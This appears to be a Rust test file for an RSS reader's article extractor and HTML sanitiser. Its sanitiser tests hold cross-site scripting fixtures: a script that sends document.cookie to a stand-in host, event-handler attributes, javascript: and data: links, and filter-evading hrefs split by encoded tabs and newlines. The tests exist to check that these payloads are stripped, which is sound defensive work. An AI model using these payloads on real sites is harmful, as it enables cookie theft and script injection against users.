//! The sanitiser tests are the important ones. Extraction quality is a matter
//! of degree; a `<script>` reaching the reading pane is a bug with teeth.

use snaprss_article::{
    extract, keep_lead_image, resolve_lazy_images, sanitise_feed_html, to_plain_text,
};

const PAGE: &str = r#"<!doctype html>
<html><head>
  <title>How conditional requests work</title>
  <meta property="og:site_name" content="Kernel Notes">
</head><body>
  <nav><a href="/">Home</a><a href="/about">About</a><a href="/tags">Tags</a></nav>
  <article>
    <h1>How conditional requests work</h1>
    <p class="byline">By Marta Vogel</p>
    <p>An entity tag is an opaque identifier for a specific version of a resource.
       When the client sends it back the server can answer with a bare 304 and no
       body at all, which is the entire point of the mechanism.</p>
    <p>The alternative validator is a modification date. It is weaker, because it
       has one-second granularity and clocks drift, but it is better than
       transferring the whole document again on every poll.</p>
    <blockquote><p>Cheap requests are polite requests.</p></blockquote>
    <pre><code class="language-http">If-None-Match: "v1"</code></pre>
    <p>Relative link to <a href="/archive">the archive</a> and an image:</p>
    <img src="/images/diagram.png" alt="a diagram">
  </article>
  <footer><p>Copyright notice, social links, and a newsletter form.</p></footer>
</body></html>"#;

#[test]
fn extracts_the_article_and_drops_the_furniture() {
    let a = extract(PAGE, "https://kn.test/posts/conditional").unwrap();

    assert!(a.text.contains("An entity tag is an opaque identifier"));
    assert!(a.text.contains("Cheap requests are polite requests"));

    assert!(!a.text.contains("newsletter form"), "footer survived");
    assert!(!a.html.contains("/tags"), "nav survived");

    assert_eq!(a.title.as_deref(), Some("How conditional requests work"));
    assert!(a.read_minutes >= 1);
}

#[test]
fn rewrites_relative_urls_against_the_page() {
    let a = extract(PAGE, "https://kn.test/posts/conditional").unwrap();
    assert!(
        a.html.contains("https://kn.test/archive"),
        "relative link not rewritten: {}",
        a.html
    );
    assert!(
        a.html.contains("https://kn.test/images/diagram.png"),
        "relative image not rewritten"
    );
}

#[test]
fn outbound_links_get_rel_protections() {
    let a = extract(PAGE, "https://kn.test/posts/conditional").unwrap();
    assert!(a.html.contains("noopener"));
    assert!(a.html.contains("noreferrer"));
}

#[test]
fn strips_script_and_friends() {
    let hostile = r#"<div>
        <p>Legitimate text that is long enough to be treated as an article body by
           any extractor worth using, repeated so the heuristics have something to
           latch onto. Legitimate text that is long enough to be treated as an
           article body. Legitimate text, again, for length.</p>
        <script>fetch('https://evil.test/?c='+document.cookie)</script>
        <style>body{display:none}</style>
        <iframe src="https://evil.test/frame"></iframe>
        <object data="https://evil.test/x"></object>
        <form action="https://evil.test/post"><input name="a"></form>
        <p onclick="steal()" onmouseover="steal()">Handlers on a paragraph.</p>
        <a href="javascript:alert(1)">javascript url</a>
        <a href="vbscript:msgbox(1)">vbscript url</a>
        <img src="x" onerror="alert(1)">
    </div>"#;

    let cleaned = sanitise_feed_html(hostile, Some("https://kn.test/"));

    for bad in [
        "<script",
        "<style",
        "<iframe",
        "<object",
        "<form",
        "onclick",
        "onerror",
        "onmouseover",
        "javascript:",
        "vbscript:",
        "evil.test/frame",
        "document.cookie",
    ] {
        assert!(!cleaned.contains(bad), "{bad:?} survived in: {cleaned}");
    }

    // The legitimate content is still there.
    assert!(cleaned.contains("Legitimate text"));
    assert!(cleaned.contains("Handlers on a paragraph"));
}

#[test]
fn keeps_the_tags_the_renderer_draws() {
    let rich = r#"<div>
        <h2>Heading</h2><p>Body <strong>bold</strong> <em>italic</em> <code>inline</code>.</p>
        <ul><li>one</li><li>two</li></ul>
        <ol><li>first</li></ol>
        <blockquote><p>quoted</p></blockquote>
        <pre><code class="language-rust">fn main() {}</code></pre>
        <figure><img src="https://kn.test/a.png" alt="alt text"><figcaption>cap</figcaption></figure>
        <table><thead><tr><th scope="col">h</th></tr></thead><tbody><tr><td colspan="2">c</td></tr></tbody></table>
        <hr><p>after</p>
    </div>"#;
    let cleaned = sanitise_feed_html(rich, None);

    for tag in [
        "<h2",
        "<strong",
        "<em",
        "<code",
        "<ul",
        "<li",
        "<ol",
        "<blockquote",
        "<pre",
        "<figure",
        "<figcaption",
        "<table",
        "<thead",
        "<th",
        "<td",
        "<hr",
    ] {
        assert!(cleaned.contains(tag), "{tag} was dropped: {cleaned}");
    }
    assert!(cleaned.contains("language-rust"), "code class dropped");
    assert!(cleaned.contains("alt=\"alt text\""), "alt text dropped");
    assert!(cleaned.contains("colspan"), "colspan dropped");
}

#[test]
fn promotes_lazy_loaded_images() {
    let lazy = r#"<div>
        <img src="" data-src="https://kn.test/one.jpg" alt="one">
        <img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" data-original="https://kn.test/two.jpg" alt="two">
        <img src="/assets/placeholder.png" srcset="https://kn.test/three.jpg 1x, https://kn.test/three@2x.jpg 2x" alt="three">
        <img src="https://kn.test/already.jpg" data-src="https://kn.test/wrong.jpg" alt="four">
    </div>"#;

    let resolved = resolve_lazy_images(lazy);
    assert!(resolved.contains("https://kn.test/one.jpg"));
    assert!(resolved.contains("https://kn.test/two.jpg"));
    assert!(
        resolved.contains("https://kn.test/three.jpg"),
        "first srcset candidate not taken"
    );
    assert!(
        !resolved.contains("wrong.jpg"),
        "a real src must not be overwritten"
    );

    // And the promoted src survives sanitisation, which was the point.
    let cleaned = sanitise_feed_html(lazy, None);
    assert!(cleaned.contains("https://kn.test/one.jpg"));
    assert!(!cleaned.contains("data-src"), "data-* should be stripped");
}

#[test]
fn feed_html_is_sanitised_without_extraction() {
    // A two-sentence summary is too short for readability to treat as an
    // article, which is exactly why this path skips extraction.
    let summary = "<p>Short summary.</p><script>alert(1)</script>";
    let cleaned = sanitise_feed_html(summary, Some("https://kn.test/"));
    assert_eq!(cleaned, "<p>Short summary.</p>");
}

#[test]
fn resolves_relative_urls_in_feed_html() {
    let summary = r#"<p>See <a href="/more">more</a>.</p>"#;
    let cleaned = sanitise_feed_html(summary, Some("https://kn.test/posts/1"));
    assert!(cleaned.contains("https://kn.test/more"), "{cleaned}");
}

#[test]
fn plain_text_strips_markup() {
    let t = to_plain_text("<p>One <strong>two</strong></p><p>three</p>");
    assert_eq!(t, "One two three");
}

#[test]
fn a_page_with_no_article_is_an_error() {
    assert!(extract("<html><body></body></html>", "https://kn.test/").is_err());
}

#[test]
fn malformed_html_does_not_panic() {
    for junk in [
        "<p>unclosed",
        "<<<>>>",
        "<div><p>nested <div>wrongly</p></div>",
        "",
        "not html at all, just prose",
        "<img src=",
    ] {
        let _ = sanitise_feed_html(junk, None);
        let _ = resolve_lazy_images(junk);
        let _ = extract(junk, "https://kn.test/");
    }
}

#[test]
fn flattens_picture_elements() {
    // A <picture> loses its image entirely if left alone: sanitisation strips
    // srcset from <source>, and the inner <img> usually has no src of its own.
    let html = r#"<div>
        <p>Body text long enough for the extractor to treat this as an article.</p>
        <picture>
          <source srcset="https://x.test/big.webp 1x, https://x.test/big2.webp 2x" type="image/webp">
          <source srcset="https://x.test/big.jpg">
          <img alt="a figure">
        </picture>
    </div>"#;
    let out = sanitise_feed_html(html, Some("https://x.test/a"));
    assert!(
        out.contains("https://x.test/big.webp"),
        "no image survived: {out}"
    );
    assert!(out.contains("alt=\"a figure\""), "alt text lost: {out}");
    assert!(!out.contains("<picture"), "picture wrapper should be gone");
    assert!(!out.contains("<source"), "source should be gone");
}

#[test]
fn picture_keeps_an_explicit_img_src() {
    let html = r#"<div><p>Long enough body text for the extractor to work with.</p>
        <picture>
          <source srcset="https://x.test/from-source.webp">
          <img src="https://x.test/explicit.jpg" alt="x">
        </picture></div>"#;
    let out = sanitise_feed_html(html, None);
    assert!(
        out.contains("explicit.jpg"),
        "the img's own src should win: {out}"
    );
    assert!(!out.contains("from-source.webp"));
}

#[test]
fn plain_http_images_are_kept() {
    // The CSP allows http: images; the sanitiser must not strip them first.
    let out = sanitise_feed_html(
        r#"<p>x</p><img src="http://insecure.test/pic.jpg" alt="i">"#,
        None,
    );
    assert!(out.contains("http://insecure.test/pic.jpg"), "{out}");
}

// gcores.com renders article images from script: the page holds an empty
// placeholder, extraction keeps an empty <figure>, and the feed's cover image
// was lost the moment the full article replaced the summary.
#[test]
fn the_feeds_lead_image_survives_extraction() {
    let summary = r#"<img src="https://image.gcores.com/4d0e.jpg?x-oss-process=image/resize,w_626&amp;q=90"><p>大家好</p>"#;
    let extracted = "<div><p>大家好</p><figure></figure></div>";
    let out = keep_lead_image(extracted, summary);
    assert!(
        out.starts_with(r#"<p><img src="https://image.gcores.com/4d0e.jpg?x-oss-process=image/resize,w_626&amp;q=90""#),
        "{out}"
    );
    assert!(out.ends_with(extracted));
}

#[test]
fn the_lead_image_is_not_doubled_when_extraction_kept_it() {
    // Same picture at a different size is still the same picture.
    let summary = r#"<img src="https://img.example/a.jpg?w=626"><p>x</p>"#;
    let extracted = r#"<p><img src="https://img.example/a.jpg?w=2000"></p><p>x</p>"#;
    assert_eq!(keep_lead_image(extracted, summary), extracted);
    // A summary without an image changes nothing.
    assert_eq!(keep_lead_image(extracted, "<p>x</p>"), extracted);
}

#[test]
fn srcset_urls_keep_their_commas_and_any_data_placeholder_is_replaced() {
    let html = r#"<div>
        <img srcset="https://res.test/upload/w_400,h_300,c_fill/a.jpg 400w, https://res.test/b.jpg 800w">
        <img src="data:image/svg+xml,%3Csvg%3E%3C/svg%3E" data-src="https://kn.test/svg-lazy.jpg">
        <img src="data:image/png;base64,iVBORw0KGgo=" data-src="https://kn.test/png-lazy.jpg">
        <picture><img src="data:image/gif;base64,R0lGOD=" data-src="https://kn.test/pic-lazy.jpg"></picture>
        <picture><img data-src="https://kn.test/pic-only-lazy.jpg"></picture>
    </div>"#;
    let out = resolve_lazy_images(html);
    assert!(out.contains("https://res.test/upload/w_400,h_300,c_fill/a.jpg"), "{out}");
    assert!(out.contains("https://kn.test/svg-lazy.jpg"), "{out}");
    assert!(out.contains("https://kn.test/png-lazy.jpg"), "{out}");
    assert!(out.contains("https://kn.test/pic-lazy.jpg"), "{out}");
    assert!(out.contains("https://kn.test/pic-only-lazy.jpg"), "{out}");
}

#[test]
fn data_urls_are_images_only_never_links() {
    let out = sanitise_feed_html(
        r#"<a href="data:text/html;base64,PHNjcmlwdD4=">x</a><img src="data:image/png;base64,iVBORw0KGgo=">"#,
        None,
    );
    assert!(!out.contains("data:text/html"), "{out}");
    assert!(out.contains("data:image/png"), "inline images still allowed: {out}");
}

#[test]
fn reading_time_counts_cjk_characters() {
    let zh: String = "机核网发布了新的文章".repeat(450); // 4,500 characters
    assert!(snaprss_article::read_minutes(&zh) >= 9, "{}", snaprss_article::read_minutes(&zh));
    let en = "word ".repeat(450);
    assert_eq!(snaprss_article::read_minutes(&en), 2);
}

#[test]
fn pages_are_decoded_in_their_own_charset() {
    let page = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><title>机核</title></head><body><p>中文正文</p></body></html>";
    let (gbk, _, _) = encoding_rs::GBK.encode(page);
    // From <meta>.
    assert!(snaprss_article::decode_html(&gbk, None).contains("中文正文"));
    // From the header, which wins over a wrong <meta>.
    let (big5, _, _) = encoding_rs::BIG5.encode("<meta charset=\"utf-8\"><p>繁體中文</p>");
    assert!(snaprss_article::decode_html(&big5, Some("text/html; charset=big5")).contains("繁體中文"));
    // Plain UTF-8 still works.
    assert!(snaprss_article::decode_html("<p>中文</p>".as_bytes(), Some("text/html")).contains("中文"));
}

#[test]
fn noscript_images_become_real_images_once() {
    let out = sanitise_feed_html(r#"<p>x</p><noscript><img src="https://a.test/b.jpg"></noscript>"#, None);
    assert!(out.contains("<img src=\"https://a.test/b.jpg\""), "{out}");
    assert!(!out.contains("&lt;img"), "{out}");
    let out = resolve_lazy_images(
        r#"<img src="data:image/gif;base64,R0l=" data-src="https://a.test/c.jpg"><noscript><img src="https://a.test/c.jpg"></noscript>"#,
    );
    assert_eq!(out.matches("https://a.test/c.jpg").count(), 1, "{out}");
}

#[test]
fn named_placeholder_files_and_empty_lazy_attributes() {
    let out = resolve_lazy_images(
        r#"<img src="/img/loading.gif" data-src="/img/real.jpg">
           <img src="/static/none.gif" file="/att/2.jpg">
           <img src="data:image/gif;base64,R0l=" data-src="" data-original="https://x.test/orig.jpg">"#,
    );
    assert!(out.contains("/img/real.jpg") && !out.contains("loading.gif"), "{out}");
    assert!(out.contains("src=\"/att/2.jpg\"") && !out.contains("none.gif"), "{out}");
    assert!(out.contains("https://x.test/orig.jpg"), "{out}");
}

#[test]
fn title_entities() {
    assert_eq!(snaprss_article::decode_entities("AT&amp;T &nbsp;news &#8212; ok &bogus;"), "AT&T  news — ok &bogus;");
}

#[test]
fn a_data_link_split_by_a_tab_or_newline_is_still_refused() {
    for href in [
        "da&#x09;ta:text/html,<script>alert(1)</script>",
        "da&#x0A;ta:text/html,x",
        "d&#x0D;ata:text/html,x",
        "&#x01; data:text/html,x",
        "&#100;ata:text/html,x",
        " DATA:text/html,x",
        "java&#x09;script:alert(1)",
        "  JaVaScRiPt:alert(1)",
    ] {
        let out = sanitise_feed_html(&format!(r#"<a href="{href}">x</a>"#), Some("https://f.test/post/1"));
        assert!(!out.contains("href"), "{href} -> {out}");
    }
    let out = sanitise_feed_html(r#"<a href="/rel">x</a><a href="mailto:a@f.test">m</a>"#, Some("https://f.test/post/1"));
    assert!(out.contains(r#"href="https://f.test/rel""#) && out.contains("mailto:a@f.test"), "{out}");
}

#[test]
fn icon_links_honour_base_href_like_feed_links() {
    let html = r#"<html><head><base href="https://cdn.test/assets/">
        <link rel="icon" href="fav.png">
        <link rel="alternate" type="application/rss+xml" href="feed.xml"></head></html>"#;
    assert_eq!(snaprss_article::icon_links(html, "https://site.test/blog/"), ["https://cdn.test/assets/fav.png"]);
    assert_eq!(snaprss_article::feed_links(html, "https://site.test/blog/")[0].url, "https://cdn.test/assets/feed.xml");
    // Without one, the page's own address.
    assert_eq!(
        snaprss_article::icon_links(r#"<link rel="icon" href="fav.png">"#, "https://site.test/blog/"),
        ["https://site.test/blog/fav.png"]
    );
}
